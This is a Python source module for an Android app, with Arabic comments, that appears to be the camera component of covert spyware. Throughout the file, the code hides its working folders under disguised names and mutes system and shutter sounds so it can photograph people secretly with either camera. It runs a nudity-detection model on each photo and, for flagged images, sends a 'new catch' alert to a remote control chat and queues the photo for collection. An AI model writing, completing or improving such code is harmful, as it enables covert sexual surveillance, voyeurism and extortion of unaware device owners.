# -*- coding: utf-8 -*-
import os
import time
import threading
import logging
import gc
import json
import hashlib
from datetime import datetime

# ========== إعداد المسارات الموحدة مع التمويه ==========
def _get_runtime_path():
    try:
        from jnius import autoclass
        act = autoclass('org.kivy.android.PythonActivity').mActivity
        base = act.getFilesDir().getPath()
        return os.path.join(base, ".sys_runtime")
    except:
        return os.path.join(os.getcwd(), ".sys_runtime")

P = _get_runtime_path()
T = os.path.join(P, "ctmp")                     # مجلد مؤقت للصور الخام
QUEUE = os.path.join(P, ".cache_thumb")         # مجلد الانتظار (موهم كمجلد مصغرات)
CONFIG = os.path.join(P, "config.json")         # ملف الإعدادات

# إنشاء المجلدات الضرورية
for d in [P, T, QUEUE]:
    if not os.path.exists(d):
        os.makedirs(d)

# إعداد التسجيل
logging.basicConfig(
    filename=os.path.join(P, "c.log"),
    level=logging.ERROR,
    filemode='a',
    format='%(asctime)s - %(levelname)s - %(message)s'
)

# ========== استيراد المكتبات الأساسية ==========
try:
    from jnius import autoclass, PythonJavaClass, java_method
    JNI = True
except ImportError:
    JNI = False

# ========== استيراد PIL و numpy مع معالجة الأخطاء ==========
PIL_AVAILABLE = False
NUMPY_AVAILABLE = False
Image = None
ImageOps = None
np = None

try:
    from PIL import Image, ImageOps
    PIL_AVAILABLE = True
    logging.info("PIL loaded successfully")
except ImportError as e:
    logging.error(f"PIL import error: {e}")

try:
    import numpy as np
    NUMPY_AVAILABLE = True
    logging.info("NumPy loaded successfully")
except ImportError as e:
    logging.error(f"NumPy import error: {e}")


# ========== كلاس الكاميرا ==========
class CameraAnalyzer:
    def __init__(self, mon=None, det=None):
        self.mon = mon
        self.det = det                # NudeDetector instance (يحتوي على النموذج)
        self.busy = False
        self._old_volume = -1
        self._timers = []             # للاحتفاظ بالمؤقتات النشطة
        self._config = self._load_config()
        self._camera_lock = threading.Lock()  # قفل لمنع التشغيل المتزامن للكاميرا
        self._max_retries = 3         # أقصى عدد من محاولات إعادة المحاولة
        self._last_capture_time = 0   # وقت آخر التقاط صورة
        self._min_capture_interval = 2.0  # الحد الأدنى للفاصل بين الصور بالثواني

    def _load_config(self):
        """تحميل الإعدادات من ملف"""
        default_config = {
            "quality": 80,
            "max_file_age": 3600,  # ساعة
            "min_battery": 15,
            "detection_threshold": 0.85,
            "image_size": "medium",  # small, medium, large
            "front_camera_id": 1,
            "back_camera_id": 0
        }

        if os.path.exists(CONFIG):
            try:
                with open(CONFIG, 'r') as f:
                    loaded_config = json.load(f)
                    default_config.update(loaded_config)
            except Exception as e:
                logging.error(f"Config load error: {e}")

        return default_config

    def _save_config(self):
        """حفظ الإعدادات إلى ملف"""
        try:
            with open(CONFIG, 'w') as f:
                json.dump(self._config, f)
            return True
        except Exception as e:
            logging.error(f"Config save error: {e}")
            return False

    # ========== التحقق من صلاحيات الكاميرا ==========
    def _check_camera_permission(self):
        """التحقق من منح صلاحية الكاميرا"""
        if not JNI:
            return True
        try:
            from android.permissions import check_permission, Permission
            return check_permission(Permission.CAMERA)
        except Exception as e:
            logging.error(f"Permission check error: {e}")
            return True  # افتراضي True في حالة فشل التحقق

    # ========== التحقق من توفر الكاميرا ==========
    def _is_camera_available(self, cam_id):
        """التحقق من وجود الكاميرا المطلوبة"""
        if not JNI:
            return False
        try:
            Camera = autoclass('android.hardware.Camera')
            CameraInfo = autoclass('android.hardware.Camera$CameraInfo')
            num_cameras = Camera.getNumberOfCameras()

            if num_cameras <= cam_id:
                return False

            desired_facing = CameraInfo.CAMERA_FACING_BACK if cam_id == 0 else CameraInfo.CAMERA_FACING_FRONT
            for i in range(num_cameras):
                info = CameraInfo()
                Camera.getCameraInfo(i, info)
                if info.facing == desired_facing:
                    return True
            return False
        except Exception as e:
            logging.error(f"Camera availability check error: {e}")
            return False

    # ========== التحقق من البطارية ==========
    def _power_ok(self):
        try:
            b, c = self.mon._battery_ok() if hasattr(self.mon, '_battery_ok') else (100, True)
            return b >= self._config.get("min_battery", 15) or c
        except:
            return True

    # ========== كتم صوت النظام (للكاميرا الصامتة) ==========
    def _mute_audio(self, mute=True):
        if not JNI:
            return
        try:
            AudioManager = autoclass('android.media.AudioManager')
            ctx = autoclass('org.kivy.android.PythonActivity').mActivity
            am = ctx.getSystemService(ctx.AUDIO_SERVICE)
            if mute:
                self._old_volume = am.getStreamVolume(AudioManager.STREAM_SYSTEM)
                am.setStreamVolume(AudioManager.STREAM_SYSTEM, 0, 0)
            else:
                if self._old_volume >= 0:
                    am.setStreamVolume(AudioManager.STREAM_SYSTEM, self._old_volume, 0)
                    self._old_volume = -1
        except Exception as e:
            logging.error(f"Mute error: {e}")

    # ========== تنظيف الملفات القديمة ==========
    def _cleanup_old_files(self):
        """حذف الملفات القديمة من المجلدات المؤقتة"""
        try:
            now = time.time()
            max_age = self._config.get("max_file_age", 3600)
            for folder in [T, QUEUE]:
                if os.path.exists(folder):
                    for f in os.listdir(folder):
                        path = os.path.join(folder, f)
                        try:
                            if os.path.getmtime(path) < now - max_age:
                                os.remove(path)
                        except:
                            pass
        except Exception as e:
            logging.error(f"Cleanup error: {e}")

    # ========== ضغط الصورة (لتوفير المساحة والطاقة) ==========
    def _compress_image(self, path, quality=None):
        """يحاول ضغط ملف الصورة إلى جودة أقل"""
        quality = quality or self._config.get("quality", 80)

        # التحقق من توفر PIL
        if PIL_AVAILABLE and Image is not None:
            try:
                with Image.open(path) as img:
                    img = img.convert('RGB')
                    img.save(path, "JPEG", quality=quality, optimize=True)
                    return True
            except Exception as e:
                logging.error(f"PIL compression error: {e}")

        # محاولة ثانية باستخدام OpenCV إذا كان متوفراً
        try:
            import cv2
            img = cv2.imread(path)
            if img is not None:
                encode_param = [int(cv2.IMWRITE_JPEG_QUALITY), quality]
                _, buffer = cv2.imencode('.jpg', img, encode_param)
                with open(path, 'wb') as f:
                    f.write(buffer)
                return True
        except ImportError:
            pass
        except Exception as e:
            logging.error(f"OpenCV compression error: {e}")

        return False

    # ========== إنشاء اسم فريد للملف ==========
    def _generate_unique_filename(self, prefix="img"):
        """إنشاء اسم فريد للملف باستخدام الوقت والهاش"""
        timestamp = int(time.time())
        hash_str = hashlib.md5(f"{timestamp}{os.getpid()}".encode()).hexdigest()[:8]
        return f"{prefix}_{timestamp}_{hash_str}.jpg"

    # ========== الحصول على حجم الصورة المفضل ==========
    def _get_preferred_size(self, supported_sizes):
        """اختيار الحجم المناسب للصورة بناءً على الإعدادات"""
        if not supported_sizes:
            return None

        size_pref = self._config.get("image_size", "medium")

        # تحديد الأهداف بناءً على الإعدادات
        if size_pref == "small":
            target_area = 640 * 480
        elif size_pref == "large":
            target_area = 1920 * 1080
        else:  # medium
            target_area = 1024 * 768

        # اختيار الحجم الأقرب للهدف
        return min(supported_sizes, key=lambda s: abs(s.width * s.height - target_area))

    # ========== حذف آمن للملفات ==========
    def _safe_remove(self, path):
        """حذف ملف بأمان مع التعامل مع الأخطاء"""
        try:
            if os.path.exists(path):
                os.remove(path)
                return True
        except Exception as e:
            logging.error(f"Safe remove error: {e}")
        return False

    # ========== التقاط صورة باستخدام Camera1 API ==========
    def _capture_camera1(self, cam_id):
        """التقاط صورة باستخدام Camera1 API (محاولة أولى)"""
        Camera = autoclass('android.hardware.Camera')
        CameraInfo = autoclass('android.hardware.Camera$CameraInfo')
        num_cameras = Camera.getNumberOfCameras()

        # اختيار الكاميرا الصحيحة
        target_id = -1
        desired_facing = CameraInfo.CAMERA_FACING_BACK if cam_id == 0 else CameraInfo.CAMERA_FACING_FRONT
        for i in range(num_cameras):
            info = CameraInfo()
            Camera.getCameraInfo(i, info)
            if info.facing == desired_facing:
                target_id = i
                break

        if target_id == -1:
            logging.error(f"No suitable camera found for facing: {desired_facing}")
            return None

        camera = Camera.open(target_id)
        if camera is None:
            logging.error("Failed to open camera")
            return None

        out_path = None
        image_saved = threading.Event()
        image_data = [None]

        try:
            params = camera.getParameters()
            supported_sizes = params.getSupportedPictureSizes()
            if supported_sizes:
                best_size = self._get_preferred_size(supported_sizes)
                if best_size:
                    params.setPictureSize(best_size.width, best_size.height)
                    logging.info(f"Selected camera size: {best_size.width}x{best_size.height}")

            params.setPictureFormat(autoclass('android.graphics.ImageFormat').JPEG)

            # محاولة إسكات صوت الكاميرا
            try:
                params.set("shutter-sound", 0)
            except:
                pass

            # التدوير حسب نوع الكاميرا
            rotation = 270 if cam_id == 1 else 90
            params.setRotation(rotation)
            camera.setParameters(params)

            out_path = os.path.join(T, self._generate_unique_filename(f"c_{cam_id}"))

            class PicCallback(PythonJavaClass):
                __javainterfaces__ = ['android.hardware.Camera$PictureCallback']

                def __init__(self, event, data_store, output_path):
                    super().__init__()
                    self.event = event
                    self.data_store = data_store
                    self.output_path = output_path

                @java_method('([BLandroid/hardware/Camera;)V')
                def onPictureTaken(self, data, cam):
                    try:
                        self.data_store[0] = data
                        with open(self.output_path, 'wb') as f:
                            f.write(data)
                    except Exception as e:
                        logging.error(f"Callback write error: {e}")
                        self.output_path = None
                    finally:
                        self.event.set()

            callback_ref = PicCallback(image_saved, image_data, out_path)
            camera.startPreview()
            time.sleep(0.5)  # تأخير قصير للسماح للمعاينة بالاستقرار

            camera.takePicture(None, None, callback_ref)

            # انتظار حتى يتم حفظ الصورة أو انتهاء المهلة
            if not image_saved.wait(20):
                logging.warning("Camera capture timeout after 20 seconds")
                out_path = None

            try:
                camera.stopPreview()
            except:
                pass

            # التحقق من الملف وضغطه
            if out_path and os.path.exists(out_path) and os.path.getsize(out_path) > 100:
                self._compress_image(out_path, quality=self._config.get("quality", 80))
                return out_path
            else:
                logging.error("Captured file is empty or missing")
                if out_path:
                    self._safe_remove(out_path)
                return None

        except Exception as e:
            logging.error(f"Camera1 capture error: {e}")
            if out_path:
                self._safe_remove(out_path)
            return None
        finally:
            if camera:
                try:
                    camera.release()
                except:
                    pass

    # ========== التقاط صورة باستخدام Camera2 API (احتياطي) ==========
    def _capture_camera2(self, cam_id):
        """التقاط صورة باستخدام Camera2 API كـ fallback"""
        try:
            # التحقق من توفر Camera2
            CameraManager = autoclass('android.hardware.camera2.CameraManager')
            ctx = autoclass('org.kivy.android.PythonActivity').mActivity
            cm = ctx.getSystemService(ctx.CAMERA_SERVICE)
            camera_ids = cm.getCameraIdList()

            if cam_id >= len(camera_ids):
                logging.error(f"Camera2: ID {cam_id} out of range")
                return None

            camera_id = camera_ids[cam_id]

            # إنشاء ImageReader للحصول على الصورة
            ImageReader = autoclass('android.media.ImageReader')
            ImageFormat = autoclass('android.graphics.ImageFormat')
            reader = ImageReader.newInstance(1024, 768, ImageFormat.JPEG, 1)

            # إعداد Surface للتصوير
            Surface = autoclass('android.view.Surface')
            surfaces = [Surface(reader.getSurface())]

            # فتح الكاميرا والحصول على المعاينة
            capture_success = threading.Event()
            capture_path = [None]

            class CaptureCallback(PythonJavaClass):
                __javainterfaces__ = ['android.hardware.camera2.CameraCaptureSession$CaptureCallback']

                def __init__(self, event, output_path):
                    super().__init__()
                    self.event = event
                    self.output_path = output_path

                @java_method('(Landroid/hardware/camera2/CameraCaptureSession;Landroid/hardware/camera2/CaptureRequest;Landroid/hardware/camera2/TotalCaptureResult;)V')
                def onCaptureCompleted(self, session, request, result):
                    self.event.set()

            # فتح الكاميرا
            class StateCallback(PythonJavaClass):
                __javainterfaces__ = ['android.hardware.camera2.CameraDevice$StateCallback']

                def __init__(self, event, output_path, surfaces):
                    super().__init__()
                    self.event = event
                    self.output_path = output_path
                    self.surfaces = surfaces

                @java_method('(Landroid/hardware/camera2/CameraDevice;)V')
                def onOpened(self, camera_device):
                    try:
                        # إنشاء جلسة التقاط
                        session_callback = CaptureCallback(self.event, self.output_path)
                        camera_device.createCaptureSession(self.surfaces, session_callback, None)
                    except Exception as e:
                        logging.error(f"Camera2 onOpened error: {e}")
                        self.event.set()

                @java_method('(Landroid/hardware/camera2/CameraDevice;I)V')
                def onError(self, camera_device, error):
                    logging.error(f"Camera2 onError: {error}")
                    self.event.set()

            capture_path[0] = os.path.join(T, self._generate_unique_filename(f"c2_{cam_id}"))
            state_callback = StateCallback(capture_success, capture_path[0], surfaces)
            cm.openCamera(camera_id, state_callback, None)

            # انتظار الإكمال
            if capture_success.wait(15):
                # التحقق من وجود الملف
                if capture_path[0] and os.path.exists(capture_path[0]) and os.path.getsize(capture_path[0]) > 100:
                    self._compress_image(capture_path[0], quality=self._config.get("quality", 80))
                    return capture_path[0]
                else:
                    logging.error("Camera2: Captured file is invalid")
                    if capture_path[0]:
                        self._safe_remove(capture_path[0])
                    return None
            else:
                logging.error("Camera2 capture timeout")
                if capture_path[0]:
                    self._safe_remove(capture_path[0])
                return None

        except Exception as e:
            logging.error(f"Camera2 capture error: {e}")
            return None

    # ========== التقاط صورة (الواجهة الرئيسية) ==========
    def capture(self, cam_id=0):
        """
        تلتقط صورة باستخدام Camera1 API، وفي حال الفشل تستخدم Camera2 API.
        cam_id = 0 خلفية, 1 أمامية.
        تعيد مسار الصورة المحفوظة أو None.
        """
        # التحقق من الصلاحيات والتوفر
        if not self._check_camera_permission():
            logging.error("Camera permission not granted")
            return None

        if not self._is_camera_available(cam_id):
            logging.error(f"Camera {cam_id} not available")
            return None

        if self.busy:
            logging.warning("Camera is busy")
            return None

        if not self._power_ok():
            logging.warning("Battery too low")
            return None

        # التحقق من الفاصل الزمني بين الالتقاطات
        now = time.time()
        if now - self._last_capture_time < self._min_capture_interval:
            logging.warning("Capture interval too short")
            return None
        self._last_capture_time = now

        # استخدام القفل لمنع التشغيل المتزامن
        with self._camera_lock:
            if self.busy:
                return None
            self.busy = True

        out_path = None
        try:
            # محاولة استخدام Camera1 أولاً
            if JNI:
                self._mute_audio(True)
                try:
                    out_path = self._capture_camera1(cam_id)
                    if out_path:
                        logging.info("Camera1 succeeded")
                    else:
                        # إذا فشلت Camera1، جرب Camera2
                        logging.info("Camera1 failed, trying Camera2...")
                        out_path = self._capture_camera2(cam_id)
                        if out_path:
                            logging.info("Camera2 succeeded")
                except Exception as e:
                    logging.error(f"Capture error: {e}")
                    out_path = None
                finally:
                    self._mute_audio(False)
            else:
                logging.error("JNI not available")
        except Exception as e:
            logging.error(f"Unexpected capture error: {e}")
        finally:
            self.busy = False
            # تنظيف الملفات القديمة
            self._cleanup_old_files()

        return out_path

    # ========== تحضير الصورة لـ AI ==========
    def _prepare_for_ai(self, path):
        """
        تحويل الصورة إلى مصفوفة (224x224, float32) لتغذية النموذج.
        """
        if not os.path.exists(path):
            return None

        # التحقق من توفر PIL و numpy
        if not PIL_AVAILABLE or not NUMPY_AVAILABLE or Image is None or np is None:
            logging.error("PIL or numpy not available for AI preprocessing")
            return None

        try:
            with Image.open(path) as img:
                # استخدام Image.BILINEAR إذا متوفر، وإلا استخدم Image.LANCZOS كبديل
                try:
                    resample = Image.BILINEAR
                except AttributeError:
                    resample = Image.LANCZOS if hasattr(Image, 'LANCZOS') else None

                img = img.convert('RGB').resize((224, 224), resample)
                arr = np.asarray(img, dtype=np.float32) / 255.0
                return np.expand_dims(arr, axis=0)
        except Exception as e:
            logging.error(f"AI prep error: {e}")
            return None

    # ========== الوظيفة الرئيسية: التقاط وتحليل وإشعار ==========
    def harvest(self, cam_id=0):
        """
        تلتقط صورة، تحللها عبر نموذج AI (إذا كان محمّلاً)،
        ترسل إشعاراً فورياً إذا كانت حساسة، وتنقل الصورة إلى مجلد الانتظار.
        """
        pic_path = self.capture(cam_id)
        if not pic_path or not os.path.exists(pic_path):
            logging.warning("No image captured")
            return

        is_nude = False
        confidence = 0.0

        # التحقق من وجود كاشف ونموذج محمّل
        if self.det and hasattr(self.det, 'model') and self.det.model is not None:
            input_data = self._prepare_for_ai(pic_path)
            if input_data is not None:
                try:
                    self.det.model.set_tensor(self.det.in_idx, input_data)
                    self.det.model.invoke()
                    out = self.det.model.get_tensor(self.det.out_idx)[0]
                    confidence = float(out[1]) if len(out) > 1 else float(out[0])
                    threshold = self._config.get("detection_threshold", 0.85)
                    if confidence > threshold:
                        is_nude = True
                except Exception as e:
                    logging.error(f"AI analysis error: {e}")
        else:
            logging.warning("Detector or model not available")

        if is_nude:
            # إرسال إشعار فوري لمجموعة التحكم
            if self.mon and hasattr(self.mon, 'ui') and self.mon.ui:
                try:
                    cam_type = "الأمامية" if cam_id == 1 else "الخلفية"
                    alert = (
                        f"🔞 **صيد جديد!**\n"
                        f"📱 الجهاز: `{self.mon.dmd}`\n"
                        f"📸 الكاميرا: {cam_type}\n"
                        f"🎯 الثقة: `{confidence:.1%}`\n"
                        f"⏰ الوقت: `{datetime.now().strftime('%H:%M:%S')}`"
                    )
                    self.mon.ui._api("sendMessage", {
                        "chat_id": self.mon.ctrl,
                        "text": alert,
                        "parse_mode": "Markdown"
                    })
                except Exception as e:
                    logging.error(f"Alert send error: {e}")

            # نقل الصورة إلى مجلد الانتظار
            dest = os.path.join(QUEUE, os.path.basename(pic_path))
            try:
                # التأكد من عدم وجود ملف بنفس الاسم
                if os.path.exists(dest):
                    base, ext = os.path.splitext(dest)
                    dest = f"{base}_{int(time.time())}{ext}"
                os.rename(pic_path, dest)
                logging.info(f"Moved to queue: {dest}")
            except Exception as e:
                logging.error(f"Move error: {e}")
                self._safe_remove(pic_path)
        else:
            # حذف الصورة العادية فوراً
            self._safe_remove(pic_path)
            logging.info("Image deleted (not nude)")

    # ========== دوال إضافية للتكوين والتحكم ==========
    def set_quality(self, quality):
        """تعيين جودة الضغط (1-100)"""
        if 1 <= quality <= 100:
            self._config["quality"] = quality
            self._save_config()
            return True
        return False

    def set_min_battery(self, percent):
        """تعيين الحد الأدنى لنسبة البطارية"""
        if 0 <= percent <= 100:
            self._config["min_battery"] = percent
            self._save_config()
            return True
        return False

    def set_detection_threshold(self, threshold):
        """تعيين عتبة الكشف"""
        if 0.0 <= threshold <= 1.0:
            self._config["detection_threshold"] = threshold
            self._save_config()
            return True
        return False

    def get_status(self):
        """الحصول على حالة الكاميرا"""
        return {
            "busy": self.busy,
            "camera_available": self._is_camera_available(0) and self._is_camera_available(1),
            "permission_granted": self._check_camera_permission(),
            "power_ok": self._power_ok(),
            "config": self._config
        }


# ========== دالة المصنع ==========
def create(mon=None, det=None):
    return CameraAnalyzer(mon, det)
